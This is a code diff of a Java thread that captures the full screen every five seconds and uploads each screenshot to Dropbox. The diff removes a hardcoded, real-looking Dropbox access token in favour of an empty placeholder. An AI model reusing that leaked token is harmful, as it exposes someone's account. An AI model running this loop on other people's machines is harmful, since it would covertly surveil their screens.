@@ -1,11 +1,16 @@
 import com.dropbox.core.DbxRequestConfig;
 import com.dropbox.core.v2.DbxClientV2;
+
 import javax.imageio.ImageIO;
 import java.awt.*;
 import java.awt.image.BufferedImage;
-import java.io.*;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+
+import static java.awt.Toolkit.getDefaultToolkit;
 
 public class MyThread extends Thread {
     public BufferedImage image;
@@ -13,17 +18,14 @@ public class MyThread extends Thread {
     @Override
     public void run() {
 
-        String ACCESS_TOKEN = "ymOhpKByt5AAAAAAAAAAVz5fApILIfc7eJ67ket7jtxRcEcECSPkWDzIq1g0GRUF";
+        String ACCESS_TOKEN = ""; //TODO Need to insert your token e.g. "String ACCESS_TOKEN = "f432423dsf432523dsfdsf2213ds""
         DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
         DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
-
-
         for (; ; ) {
-            BufferedImage image = null;
             try {
                 Robot robot = new Robot();
-                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-                image = robot.createScreenCapture(screenRect);
+                Rectangle screenRect = new Rectangle(getDefaultToolkit().getScreenSize());
+                BufferedImage image = robot.createScreenCapture(screenRect);
                 ByteArrayOutputStream os = new ByteArrayOutputStream();
 
                 SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd_HHmmss");
@@ -35,16 +37,10 @@ public class MyThread extends Thread {
 
                 client.files().uploadBuilder("/" + date + ".png")
                         .uploadAndFinish(is);
-
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-            try {
                 sleep(5000);
             } catch (Exception e) {
                 e.printStackTrace();
             }
-
         }
     }
 }
